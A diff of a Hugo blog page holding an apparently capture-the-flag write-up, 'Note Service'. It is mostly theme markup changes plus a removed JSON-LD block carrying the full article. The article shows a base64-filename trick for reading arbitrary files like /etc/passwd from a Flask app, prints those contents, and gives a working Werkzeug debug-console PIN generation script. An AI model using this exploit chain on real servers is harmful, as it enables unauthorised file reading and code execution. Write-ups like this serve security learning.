@@ -1,29 +1,29 @@
+
+
 <!DOCTYPE html>
 <html lang="en-US">
-
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="UTF-8">
+<head><meta charset="UTF-8">
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta http-equiv="X-UA-Compatible" content="ie=edge"><meta name="robots" content="index, follow"><meta name="author" content="Gabriel Yip">
-<meta name="description" content="Continuing Hermit&#39;s legacy to be minimal and fast theme">
-<link rel="author" type="text/plain" href="/humans.txt">
+<meta http-equiv="X-UA-Compatible" content="ie=edge"><meta name="robots" content="index, follow">
+<meta name="revisit-after" content="15 days"><link rel="author" href="/humans.txt">
 <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
 <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
 <link rel="manifest" href="/site.webmanifest">
 <meta name="msapplication-TileImage" content="/mstile-144x144.png">
 <meta name="theme-color" content="#494f5c">
 <meta name="msapplication-TileColor" content="#494f5c">
-<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#494f5c">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#494f5c"><meta name="author" content="Gabriel Yip"><meta name="description" content="Gabriel Yip&#39;s portfolio and blog stuff.">
 
   <meta itemprop="name" content="Note Service">
-  <meta itemprop="description" content="Note-Service 🫣 Observation We see a very simple flask website with upload and download function. When you upload a file on the website, it will save the file and change the title as the base64 of the first 50 bytes. Meaning if I uploaded a file named abc.txt with content abcdefg, the file will be saved as YWJjZGVmZw== as the tite, with the content as abcdefg.">
+  <meta itemprop="description" content="Note-Service 🫣 Observation We see a very simple flask website with file upload and download function. When you upload a file on the website, it will save the file and change the file name as the base64 of the content’s first 50 bytes. Meaning if I uploaded a file named abc.txt with content abcdefg, the file will be saved as YWJjZGVmZw== as the file name, with the content as abcdefg.">
   <meta itemprop="datePublished" content="2025-06-10T20:33:57+10:00">
   <meta itemprop="dateModified" content="2025-06-10T20:33:57+10:00">
-  <meta itemprop="wordCount" content="1027">
+  <meta itemprop="wordCount" content="997">
   <meta itemprop="keywords" content="Untagged"><meta property="og:url" content="http://localhost:1313/en/posts/rcr-writeup/note-service/">
   <meta property="og:site_name" content="Gabriel Yip">
   <meta property="og:title" content="Note Service">
-  <meta property="og:description" content="Note-Service 🫣 Observation We see a very simple flask website with upload and download function. When you upload a file on the website, it will save the file and change the title as the base64 of the first 50 bytes. Meaning if I uploaded a file named abc.txt with content abcdefg, the file will be saved as YWJjZGVmZw== as the tite, with the content as abcdefg.">
+  <meta property="og:description" content="Note-Service 🫣 Observation We see a very simple flask website with file upload and download function. When you upload a file on the website, it will save the file and change the file name as the base64 of the content’s first 50 bytes. Meaning if I uploaded a file named abc.txt with content abcdefg, the file will be saved as YWJjZGVmZw== as the file name, with the content as abcdefg.">
   <meta property="og:locale" content="en_US">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
@@ -33,45 +33,12 @@
 
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="Note Service">
-  <meta name="twitter:description" content="Note-Service 🫣 Observation We see a very simple flask website with upload and download function. When you upload a file on the website, it will save the file and change the title as the base64 of the first 50 bytes. Meaning if I uploaded a file named abc.txt with content abcdefg, the file will be saved as YWJjZGVmZw== as the tite, with the content as abcdefg.">
-
-<script type="application/ld+json">
-{
-    "@context": "https://schema.org",
-    "@type": "BlogPosting",
-    "headline": "Note Service",
-    "name": "Note Service",
-    "description": "Note-Service 🫣 Observation We see a very simple flask website with upload and download function. When you upload a file on the website, it will save the file and change the title as the base64 of the first 50 bytes. Meaning if I uploaded a file named abc.txt with content abcdefg, the file will be saved as YWJjZGVmZw== as the tite, with the content as abcdefg.\n",
-    "keywords": ["untagged"],
-    "articleBody": "Note-Service 🫣 Observation We see a very simple flask website with upload and download function. When you upload a file on the website, it will save the file and change the title as the base64 of the first 50 bytes. Meaning if I uploaded a file named abc.txt with content abcdefg, the file will be saved as YWJjZGVmZw== as the tite, with the content as abcdefg.\nObservation 1: If the file is not uploaded before, you cannot retrieve the file. Also, if the file already existed on the server, the file would not be uploaded and the original file will be retained in the server. For example, if a file named flag.txt is already on the server, retrieving flag.txt will return an error as the file was not uploaded.\nBut why does these matter? Let’s check out a snippet of the backend for the upload file and see where the vulnerability lies,\n@app.route(\"/\", methods=[\"GET\", \"POST\"]) #11 def index(): #12 if request.method == \"POST\": #13 print(request.files) #14 note_content = request.files[\"note\"].stream.read() #15 note_title = b64encode(note_content[:50]).decode() #16 uploaded_files.add(note_title) #17 print(note_title) #18 print(note_content) #19 flash(\"Your file has been successfully uploaded!\", \"success\") #20 if os.path.exists(note_title): #21 flash(f\"The file {note_title} already exists!\", \"danger\") #22 else: #23 open(note_title, \"wb\").write(note_content) #24 flash(f\"Your file has been written to! It has been saved with the title: {note_title}\", \"success\") #25 Notice Line #17? An array uploaded_files appends the title no matter if the file existed already on the server or not! Meaning even if a file already existed on the server before, it will not replace the file with the one you uploaded. However you can retrieve the file originally on the server.\nObservation 2: VERY IMPORTANT! Flask debug is on! and https:///console is out in the public!!! If you manage to cause an error (Just try to retrieve an empty file), you will get a snippet of the source code around the line the error was thrown. Most importantly, the path the backend server is in the error logs! From this, you will know the python script is located at /a/very/strange/working/directory/server.py! (sus!)\n🧠 Think process With all those observations, An idea comes to my mind. Could we access ANY files other than the uploaded one? The answer is YES! (With a few exceptions). If we want to retrieve /etc/passwd, how would we do it?\nFirst, we would need to add /etc/passwd in the array uploaded_files.\nCheck out this snippet of the server.py code:\nnote_title = b64encode(note_content[:50]).decode() #16 uploaded_files.add(note_title) #17 What we want is a string, AFTER it being base64 encoded, it becomes /etc/passwd. Easy enough, right? We just need to run b64decode(b'/etc/passwd') in python and that’s it!\nBUT this would produce an error. Specifically binascii.Error: Incorrect padding. For it to a valid base64 string, its length must be an increment of 4 and every character has to be A-Z, a-z, 0-9, + or /. We need to somehow turn this path (/etc/passwd) lengthed 11 now to a length 12 path. Easy enough! We just add a / in front, making the path //etc/passwd. This would let us access the file while fitting the criteria for a vaid base64 string.\n\u003e\u003e\u003e payload = b64decode(b'//etc/passwd') \u003e\u003e\u003e print(payload) b'\\xff\\xf7\\xads\\xfaZ\\xb2\\xcc\\x1d' \u003e\u003e\u003e with open(\"input.bin\", \"wb\") as f: ... f.write(payload) Nice! Upload input.bin and it will show the file already existed! But since //etc/passwd is in the uploaded_files array, we could access //etc/passwd and see the content of file!\n« PHOTO OF PASSWD »\nThis means as long as the filepath is valid base64 string, we could access it! Nice! Let’s try to retrieve flag.txt then!\nNOPE! Since flag.txt has a . in the title, it is an invalid base64 string. Not that easy huh… damn it!\nSolution I stumble on this article about Werkzeug Console PIN Exploit. tldr you need these variables to get the console PIN:\nprobably_public_bits = [ username, modname, getattr(app, '__name__', getattr(app.__class__, '__name__')), getattr(mod, '__file__', None), ] private_bits = [ str(uuid.getnode()), get_machine_id(), ] For more info check the article here.\nUsing similar process above, I was able to retrieve the following files:\nContents of //etc/passwd:\nroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin jacobi:x:100:65534::/nonexistent:/usr/sbin/nologin Contents of ////proc/net/arp:\nIP address HW type Flags HW address Mask Device 172.17.0.1 0x1 0x2 d6:d4:b8:80:74:e6 * eth0 Contents of //sys/class/net/eth0/address:\n6a:0a:ec:e5:6c:45 Contents of ///proc/self/cmdline:\n/usr/local/bin/python server.py --boot_id_file ./bootid Contents of /a/very/strange/working/directory/bootid:\n290a0861-7055-4ec3-9916-cdb1f7e47fcc Contents of ////proc/self/cgroup:\n0::/ After retrieving all these files, we can finally piece everything together and generate the PIN for the console! Using this python script:\nimport hashlib import itertools from itertools import chain def crack_md5(username, modname, appname, flaskapp_path, node_uuid, machine_id): h = hashlib.md5() crack(h, username, modname, appname, flaskapp_path, node_uuid, machine_id) def crack_sha1(username, modname, appname, flaskapp_path, node_uuid, machine_id): h = hashlib.sha1() crack(h, username, modname, appname, flaskapp_path, node_uuid, machine_id) def crack(hasher, username, modname, appname, flaskapp_path, node_uuid, machine_id): probably_public_bits = [ username, modname, appname, flaskapp_path ] private_bits = [ node_uuid, machine_id ] h = hasher for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) if __name__ == '__main__': usernames = ['jacobi'] modnames = ['flask.app', 'werkzeug.debug'] appnames = ['wsgi_app', 'DebuggedApplication', 'Flask'] flaskpaths = ['/usr/local/lib/python3.13/site-packages/flask/app.py'] nodeuuids = ['116595156675653'] machineids = ['290a0861-7055-4ec3-9916-cdb1f7e47fcc'] # Generate all possible combinations of values combinations = itertools.product(usernames, modnames, appnames, flaskpaths, nodeuuids, machineids) # Iterate over the combinations and call the crack() function for each one for combo in combinations: username, modname, appname, flaskpath, nodeuuid, machineid = combo print('==========================================================================') crack_sha1(username, modname, appname, flaskpath, nodeuuid, machineid) print(f'{combo}') print('==========================================================================') The first generated pin is\n========================================================================== 684-847-740 ('jacobi', 'flask.app', 'wsgi_app', '/usr/local/lib/python3.13/site-packages/flask/app.py', '116595156675653', '290a0861-7055-4ec3-9916-cdb1f7e47fcc') ========================================================================== and if you enter it in the pin prompt, IT WORKS!! OMG! We just need to retrieve le flag. Inside the debug console, We enter this:\n\u003e\u003e\u003e print(open('flag.txt', 'r').read()) RCR{rC3_Just_t0_ReaD_4_fiL3?} Other useful resource for Werkzeug Console PIN Exploit: DANGEROUS Python Flask Debug Mode Vulnerabilities - John Hammond ",
-    "wordCount" : "1027",
-    "inLanguage": "en",
-    "datePublished": "2025-06-10T20:33:57+10:00",
-    "dateModified": "2025-06-10T20:33:57+10:00",
-    "author":{
-        "@type": "Person",
-        "name": "Gabriel Yip",
-        "url": "http://localhost:1313/en/about-me/"
-        },
-    "mainEntityOfPage": {
-      "@type": "WebPage",
-      "@id": "http://localhost:1313/en/posts/rcr-writeup/note-service/"
-    },
-    "publisher": {
-      "@type": "Organization",
-      "name": "Gabriel Yip",
-      "description": "Continuing Hermit's legacy to be minimal and fast theme",
-      "logo": {
-        "@type": "ImageObject",
-        "url": "http://localhost:1313/favicon.ico"
-      }
-    }
-}
-</script><title>Note Service</title><link rel="stylesheet dns-prefetch preconnect preload prefetch" as="style" media="screen" href="http://localhost:1313/css/style.min.a6589451c6f8e34213c97fa652022871f24f2b27add442cf7cced35714e917f5.css" integrity="sha256-pliUUcb440ITyX+mUgIocfJPKyet1ELPfM7TVxTpF/U=" crossorigin="anonymous">
+  <meta name="twitter:description" content="Note-Service 🫣 Observation We see a very simple flask website with file upload and download function. When you upload a file on the website, it will save the file and change the file name as the base64 of the content’s first 50 bytes. Meaning if I uploaded a file named abc.txt with content abcdefg, the file will be saved as YWJjZGVmZw== as the file name, with the content as abcdefg.">
+<title>Note Service</title>
+<link rel="stylesheet dns-prefetch preconnect preload prefetch" as="style" href="http://localhost:1313/css/style.min.7c0e79e24910e801ec98b786b483cf6dd39bfcecc4a63f214f2a97ac91cb528b.css" integrity="sha256-fA554kkQ6AHsmLeGtIPPbdOb/OzEpj8hTyqXrJHLUos=" crossorigin="anonymous">
 	</head>
-
 <body id="page">
-	<header id="site-header">
+	<header id="site-header" class="animated slideInUp">
 		<div class="hdr-wrapper section-inner">
 			<div class="hdr-left">
 				<div class="site-branding">
@@ -80,24 +47,7 @@
 				<nav class="site-nav hide-in-mobile"><a href="http://localhost:1313/en/posts/">Posts</a><a href="http://localhost:1313/en/projects/">Projects</a><a href="http://localhost:1313/en/about-me/">About Me</a></nav>
 			</div>
 			<div class="hdr-right hdr-icons">
-				<span class="hdr-links hide-in-mobile"><a href="https://github.com/6plosive" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
-   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-   <path
-      d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
-   </path>
-</svg></a><a href="https://www.linkedin.com/in/yip-gabriel/" target="_blank" rel="noopener me" title="Linkedin"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
-   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-   <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
-   <rect x="2" y="9" width="4" height="12"></rect>
-   <circle cx="4" cy="4" r="2"></circle>
-</svg></a></span><button id="share-btn" class="hdr-btn" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-share-2">
-      <circle cx="18" cy="5" r="3"></circle>
-      <circle cx="6" cy="12" r="3"></circle>
-      <circle cx="18" cy="19" r="3"></circle>
-      <line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line>
-      <line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line>
-   </svg></button>
+				<span class="hdr-social hide-in-mobile"><a href="https://github.com/6plosive" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a><a href="https://www.linkedin.com/in/yip-gabriel/" target="_blank" rel="noopener me" title="Linkedin"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg></a></span><button id="share-btn" class="hdr-btn" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-share-2"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line></svg></button>
  
 <div id="share-links" class="animated fast">
     
@@ -106,46 +56,22 @@
     
     <ul>
         <li>
-            <a href="https://twitter.com/intent/tweet?hashtags=hermit2&amp;url=http%3a%2f%2flocalhost%3a1313%2fen%2fposts%2frcr-writeup%2fnote-service%2f&amp;text=Note%20Service" target="_blank" rel="noopener" aria-label="Share on X"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
-   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-   <path class="st0" d="m21.3 21.1 -11.4 -18.2h-7.2l11.4 18.2zm-18.6 0 7.2 -6.6m4.2 -5 7.2 -6.6" />
-</svg></a>
+            <a href="https://twitter.com/intent/tweet?hashtags=hermit2&amp;url=http%3a%2f%2flocalhost%3a1313%2fen%2fposts%2frcr-writeup%2fnote-service%2f&amp;text=Note%20Service" target="_blank" rel="noopener" aria-label="Share on X"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path class="st0" d="m21.3 21.1 -11.4 -18.2h-7.2l11.4 18.2zm-18.6 0 7.2 -6.6m4.2 -5 7.2 -6.6"/></svg></a>
         </li>
         <li>
-            <a href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fen%2fposts%2frcr-writeup%2fnote-service%2f" target="_blank" rel="noopener" aria-label="Share on Facebook"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
-   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-   <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
-</svg></a>
+            <a href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fen%2fposts%2frcr-writeup%2fnote-service%2f" target="_blank" rel="noopener" aria-label="Share on Facebook"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg></a>
         </li>
         <li>
-            <a href="mailto:?subject=Note%20Service&amp;body=http%3a%2f%2flocalhost%3a1313%2fen%2fposts%2frcr-writeup%2fnote-service%2f" target="_self" rel="noopener" aria-label="Share on Email"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
-   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-   <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
-   <polyline points="22,6 12,13 2,6"></polyline>
-</svg></a>
+            <a href="mailto:?subject=Note%20Service&amp;body=http%3a%2f%2flocalhost%3a1313%2fen%2fposts%2frcr-writeup%2fnote-service%2f" target="_self" rel="noopener" aria-label="Share on Email"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></a>
         </li>
         <li>
-            <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fen%2fposts%2frcr-writeup%2fnote-service%2f&amp;source=http%3a%2f%2flocalhost%3a1313%2f&amp;title=Note%20Service&amp;summary=Note%20Service%2c%20by%20Gabriel%20Yip%0a%0a%3cnil%3e%0a" target="_blank" rel="noopener" aria-label="Share on LinkedIn"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none"
-   stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-   <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
-   <rect x="2" y="9" width="4" height="12"></rect>
-   <circle cx="4" cy="4" r="2"></circle>
-</svg></a>
+            <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fen%2fposts%2frcr-writeup%2fnote-service%2f&amp;source=http%3a%2f%2flocalhost%3a1313%2f&amp;title=Note%20Service&amp;summary=Note%20Service%2c%20by%20Gabriel%20Yip%0a%0a%3cnil%3e%0a" target="_blank" rel="noopener" aria-label="Share on LinkedIn"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg></a>
         </li>
         <li>
-            <a href="#" onclick="linkShare(&#34;Note Service&#34;,&#34;http://localhost:1313/en/posts/rcr-writeup/note-service/&#34;,&#34;Note Service, by Gabriel Yip\n\n\u003cnil\u003e\n&#34;); return false;" target="_self" rel="noopener" aria-label="Copy Link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-copy">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
-   </svg></a>
+            <a href="#" onclick="linkShare(&#34;Note Service&#34;,&#34;http://localhost:1313/en/posts/rcr-writeup/note-service/&#34;,&#34;Note Service, by Gabriel Yip\n\n\u003cnil\u003e\n&#34;); return false;" target="_self" rel="noopener" aria-label="Copy Link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-copy"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg></a>
         </li>
     </ul>
-</div><button id="menu-btn" class="hdr-btn" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu">
-      <line x1="3" y1="12" x2="21" y2="12"></line>
-      <line x1="3" y1="6" x2="21" y2="6"></line>
-      <line x1="3" y1="18" x2="21" y2="18"></line>
-   </svg></button>
+</div><button id="menu-btn" class="hdr-btn" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
 			</div>
 		</div>
 	</header>
@@ -160,50 +86,24 @@
 
 	<main class="site-main section-inner animated fadeIn faster"><article class="thin">
 			<header class="post-header">
-				<div class="post-date"><span>Jun 10, 2025</span></div>
+				<div class="post-meta"><span>Jun 10, 2025</span></div>
 				<h1>Note Service</h1>
 			</header>
-			<div class="post-description"><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-   stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-feather">
-   <path d="M20.24 12.24a6 6 0 0 0-8.49-8.49L5 10.5V19h8.5z"></path>
-   <line x1="16" y1="8" x2="2" y2="22"></line>
-   <line x1="17.5" y1="15" x2="9" y2="15"></line>
-</svg><a href="http://localhost:1313/en/about-me/" target="_blank">Gabriel Yip</a></p>
-<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon">
-      <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path>
-      <line x1="7" y1="7" x2="7" y2="7"></line>
-   </svg><span class="tag"><a href="http://localhost:1313/en/tags/untagged">untagged</a></span></p>
-<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
-      <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
-      <polyline points="14 2 14 8 20 8"></polyline>
-      <line x1="16" y1="13" x2="8" y2="13"></line>
-      <line x1="16" y1="17" x2="8" y2="17"></line>
-      <polyline points="10 9 9 9 8 9"></polyline>
-   </svg>1027&nbsp  … ⏲ Reading Time:4 Minutes, 40 Seconds</p>
-<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
-      <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
-      <line x1="16" y1="2" x2="16" y2="6"></line>
-      <line x1="8" y1="2" x2="8" y2="6"></line>
-      <line x1="3" y1="10" x2="21" y2="10"></line>
-   </svg>2025-06-10 20:33 &#43;1000
-</p></div>
+			<div class="post-info"><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-feather"><path d="M20.24 12.24a6 6 0 0 0-8.49-8.49L5 10.5V19h8.5z"></path><line x1="16" y1="8" x2="2" y2="22"></line><line x1="17.5" y1="15" x2="9" y2="15"></line></svg><a href="/en/about-me/" target="_blank">Gabriel Yip</a></p>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="http://localhost:1313/en/tags/untagged">untagged</a></span></p>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>
+    … ⏲ Reading Time:
+    
+    
+    
+    4 Minutes, 31 Seconds</p>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2025-06-10 20:33 &#43;1000</p></div>
 			<hr class="post-end">
 			<div class="content">
-				 <h2 id="note-service">Note-Service<a href="#note-service" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
-      stroke-linecap="round" stroke-linejoin="round">
-      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
-      <line x1="8" y1="12" x2="16" y2="12"></line>
-   </svg></a></h2>
-<h3 id="-observation">🫣 Observation<a href="#-observation" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
-      stroke-linecap="round" stroke-linejoin="round">
